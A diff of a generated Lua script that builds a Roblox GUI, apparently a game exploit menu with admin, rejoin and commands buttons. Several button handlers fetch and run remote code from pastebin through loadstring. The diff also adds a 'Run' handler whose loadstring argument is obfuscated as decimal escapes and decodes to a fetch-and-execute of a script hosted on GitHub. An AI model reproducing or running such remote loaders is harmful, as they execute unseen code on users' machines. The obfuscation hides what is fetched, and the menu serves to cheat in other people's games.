@@ -1,6 +1,6 @@
 -- Gui to Lua
 -- Version: 3.2
-
+--en
 -- Instances:
 
 local deeri = Instance.new("ScreenGui")
@@ -215,7 +215,7 @@ closedown.TextWrapped = true
 
 clickclear2.Name = "clickclear2"
 clickclear2.Parent = opendownitems
-clickclear2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+clickclear2.BackgroundColor3 = Color3.fromRGB(84, 84, 84)
 clickclear2.Position = UDim2.new(0.630026817, 0, 0, 0)
 clickclear2.Size = UDim2.new(0, 138, 0, 50)
 clickclear2.Visible = false
@@ -735,61 +735,61 @@ closeforcolorsettings.TextWrapped = true
 
 -- Scripts:
 
-local function ZTKDNG_fake_script() -- openup.openupbuttons 
+local function KVCP_fake_script() -- openup.openupbuttons 
 	local script = Instance.new('LocalScript', openup)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.openupitems.Visible = true
 	end)
 end
-coroutine.wrap(ZTKDNG_fake_script)()
-local function KKFZGOL_fake_script() -- opendown.opendownbutton 
+coroutine.wrap(KVCP_fake_script)()
+local function KSRKZD_fake_script() -- opendown.opendownbutton 
 	local script = Instance.new('LocalScript', opendown)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.opendownitems.Visible = true
 	end)
 end
-coroutine.wrap(KKFZGOL_fake_script)()
-local function HVLCW_fake_script() -- adminbutton.admin button script 
+coroutine.wrap(KSRKZD_fake_script)()
+local function YPPJ_fake_script() -- adminbutton.admin button script 
 	local script = Instance.new('LocalScript', adminbutton)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGetAsync("https://pastebin.com/raw/qsM4xDCX"))()
 	end)
 end
-coroutine.wrap(HVLCW_fake_script)()
-local function TBIG_fake_script() -- closeup.closeupitems 
+coroutine.wrap(YPPJ_fake_script)()
+local function LXKEF_fake_script() -- closeup.closeupitems 
 	local script = Instance.new('LocalScript', closeup)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(TBIG_fake_script)()
-local function HRVC_fake_script() -- colorsettings.opencolorsettings 
+coroutine.wrap(LXKEF_fake_script)()
+local function GMDRZF_fake_script() -- colorsettings.opencolorsettings 
 	local script = Instance.new('LocalScript', colorsettings)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Parent.Parent.colorsettings.Visible = true
 	end)
 end
-coroutine.wrap(HRVC_fake_script)()
-local function JPAIZUR_fake_script() -- openextrabuttonsup.open extrtabuttons upscript 
+coroutine.wrap(GMDRZF_fake_script)()
+local function DJXN_fake_script() -- openextrabuttonsup.open extrtabuttons upscript 
 	local script = Instance.new('LocalScript', openextrabuttonsup)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Parent["extra buttons"].Visible = true
 	end)
 end
-coroutine.wrap(JPAIZUR_fake_script)()
-local function RBCOW_fake_script() -- rejoinbutton.rejoin button script 
+coroutine.wrap(DJXN_fake_script)()
+local function WRDGDT_fake_script() -- rejoinbutton.rejoin button script 
 	local script = Instance.new('LocalScript', rejoinbutton)
 
 	
 	
 	script.Parent.MouseButton1Click:Connect(function()
-		if script.Parent.Parent.Parent["extra buttons"]["silent rejoin lable"]["silent rejoin toggle"].BackgroundColor3 == Color3.fromHSV(0, 0, 1) then
+		if script.Parent.Parent.Parent["extra buttons"]["silent rejoin lable"]["silent rejoin toggle"].BackgroundColor3 == Color3.fromHSV(0, 0, 1) and _G.sr == false then
 			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Rejoining', 'All')
 		end 
 		local ts = game:GetService("TeleportService")
@@ -797,16 +797,16 @@ local function RBCOW_fake_script() -- rejoinbutton.rejoin button script
 		ts:Teleport(game.PlaceId, p)
 	end)
 end
-coroutine.wrap(RBCOW_fake_script)()
-local function ZPOYN_fake_script() -- closedown.closedownitems 
+coroutine.wrap(WRDGDT_fake_script)()
+local function KWFGHRU_fake_script() -- closedown.closedownitems 
 	local script = Instance.new('LocalScript', closedown)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(ZPOYN_fake_script)()
-local function APUK_fake_script() -- clickclear2.clickclear2scriipt 
+coroutine.wrap(KWFGHRU_fake_script)()
+local function HERRHQ_fake_script() -- clickclear2.clickclear2scriipt 
 	local script = Instance.new('LocalScript', clickclear2)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -829,8 +829,8 @@ local function APUK_fake_script() -- clickclear2.clickclear2scriipt
 		
 	end)
 end
-coroutine.wrap(APUK_fake_script)()
-local function RHFEJV_fake_script() -- clickclear.clickclear1script 
+coroutine.wrap(HERRHQ_fake_script)()
+local function BWYGO_fake_script() -- clickclear.clickclear1script 
 	local script = Instance.new('LocalScript', clickclear)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -852,32 +852,32 @@ local function RHFEJV_fake_script() -- clickclear.clickclear1script
 		
 	end)
 end
-coroutine.wrap(RHFEJV_fake_script)()
-local function QDKP_fake_script() -- openextrabuttonsdown.open extra buttons down script 
+coroutine.wrap(BWYGO_fake_script)()
+local function SDTXOMP_fake_script() -- openextrabuttonsdown.open extra buttons down script 
 	local script = Instance.new('LocalScript', openextrabuttonsdown)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Parent["extra buttons"].Visible = true
 	end)
 end
-coroutine.wrap(QDKP_fake_script)()
-local function TCSXW_fake_script() -- requiredhatsbutton.open required hats 
+coroutine.wrap(SDTXOMP_fake_script)()
+local function DVNSEY_fake_script() -- requiredhatsbutton.open required hats 
 	local script = Instance.new('LocalScript', requiredhatsbutton)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent["required hats frame"].Visible = true
 	end)
 end
-coroutine.wrap(TCSXW_fake_script)()
-local function ANQMDL_fake_script() -- closebutton.close button script 
+coroutine.wrap(DVNSEY_fake_script)()
+local function XWUWDDY_fake_script() -- closebutton.close button script 
 	local script = Instance.new('LocalScript', closebutton)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(ANQMDL_fake_script)()
-local function IGEOHBE_fake_script() -- commandsbutton.open commands button 
+coroutine.wrap(XWUWDDY_fake_script)()
+local function UQHV_fake_script() -- commandsbutton.open commands button 
 	local script = Instance.new('LocalScript', commandsbutton)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -886,24 +886,24 @@ local function IGEOHBE_fake_script() -- commandsbutton.open commands button
 		
 	end)
 end
-coroutine.wrap(IGEOHBE_fake_script)()
-local function TQYHI_fake_script() -- updatesbutton.updates script 
+coroutine.wrap(UQHV_fake_script)()
+local function LNUCMX_fake_script() -- updatesbutton.updates script 
 	local script = Instance.new('LocalScript', updatesbutton)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		loadstring(game:HttpGetAsync("https://pastebin.com/raw/7QR0gh1N"))()
 	end)
 end
-coroutine.wrap(TQYHI_fake_script)()
-local function JIRO_fake_script() -- closeextrabuttons.closeextrabuttons script 
+coroutine.wrap(LNUCMX_fake_script)()
+local function QGVX_fake_script() -- closeextrabuttons.closeextrabuttons script 
 	local script = Instance.new('LocalScript', closeextrabuttons)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(JIRO_fake_script)()
-local function KILHDFO_fake_script() -- silentrejointoggle.LocalScript 
+coroutine.wrap(QGVX_fake_script)()
+local function YEUW_fake_script() -- silentrejointoggle.LocalScript 
 	local script = Instance.new('LocalScript', silentrejointoggle)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -915,8 +915,8 @@ local function KILHDFO_fake_script() -- silentrejointoggle.LocalScript
 	
 	end)
 end
-coroutine.wrap(KILHDFO_fake_script)()
-local function YCBMAB_fake_script() -- Main.dragable 
+coroutine.wrap(YEUW_fake_script)()
+local function NGYOS_fake_script() -- Main.dragable 
 	local script = Instance.new('LocalScript', Main)
 
 	local main = script.Parent.Parent.Main
@@ -925,8 +925,8 @@ local function YCBMAB_fake_script() -- Main.dragable
 	
 	main.Draggable = true
 end
-coroutine.wrap(YCBMAB_fake_script)()
-local function PMADS_fake_script() -- resetcolorbutton.resetcolorscript 
+coroutine.wrap(NGYOS_fake_script)()
+local function QOXV_fake_script() -- resetcolorbutton.resetcolorscript 
 	local script = Instance.new('LocalScript', resetcolorbutton)
 
 	mainui = script.Parent.Parent.Parent.Main
@@ -1026,8 +1026,8 @@ local function PMADS_fake_script() -- resetcolorbutton.resetcolorscript
 	end)
 	
 end
-coroutine.wrap(PMADS_fake_script)()
-local function BWDRD_fake_script() -- darkmodebutton.darkmode script 
+coroutine.wrap(QOXV_fake_script)()
+local function WBZLXZU_fake_script() -- darkmodebutton.darkmode script 
 	local script = Instance.new('LocalScript', darkmodebutton)
 
 	mainui = script.Parent.Parent.Parent.Main
@@ -1125,8 +1125,8 @@ local function BWDRD_fake_script() -- darkmodebutton.darkmode script
 	end)
 	
 end
-coroutine.wrap(BWDRD_fake_script)()
-local function NXCNIR_fake_script() -- punpkinmode.pumpkinmodescript 
+coroutine.wrap(WBZLXZU_fake_script)()
+local function ZZNLZK_fake_script() -- punpkinmode.pumpkinmodescript 
 	local script = Instance.new('LocalScript', punpkinmode)
 
 	mainui = script.Parent.Parent.Parent.Main
@@ -1224,12 +1224,35 @@ local function NXCNIR_fake_script() -- punpkinmode.pumpkinmodescript
 	end)
 	
 end
-coroutine.wrap(NXCNIR_fake_script)()
-local function HVLIE_fake_script() -- closeforcolorsettings.closecolorsettings 
+coroutine.wrap(ZZNLZK_fake_script)()
+local function JIRG_fake_script() -- closeforcolorsettings.closecolorsettings 
 	local script = Instance.new('LocalScript', closeforcolorsettings)
 
 	script.Parent.MouseButton1Click:Connect(function()
 		script.Parent.Parent.Visible = false
 	end)
 end
-coroutine.wrap(HVLIE_fake_script)()
+coroutine.wrap(JIRG_fake_script)()
+local function JHQS_fake_script() -- deeri.LocalScript 
+	local script = Instance.new('LocalScript', deeri)
+
+	Run = script.Parent.Main.Run
+	deeri = script.Parent.Parent.deeri
+	Run.MouseButton1Down:Connect(function()
+		loadstring('\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\68\101\101\114\105\49\47\105\110\101\47\109\97\105\110\47\67\109\100\115\34\41\41\40\41\32')()
+	end)
+	
+	
+	local UserInputService = game:GetService("UserInputService")
+	
+	UserInputService.InputBegan:Connect(function(keyCode)
+		if keyCode.keyCode == Enum.KeyCode.KeypadMinus then
+			if deeri.Enabled == true then
+				deeri.Enabled = false
+			else
+				deeri.Enabled = true
+			end
+		end
+	end)
+end
+coroutine.wrap(JHQS_fake_script)()
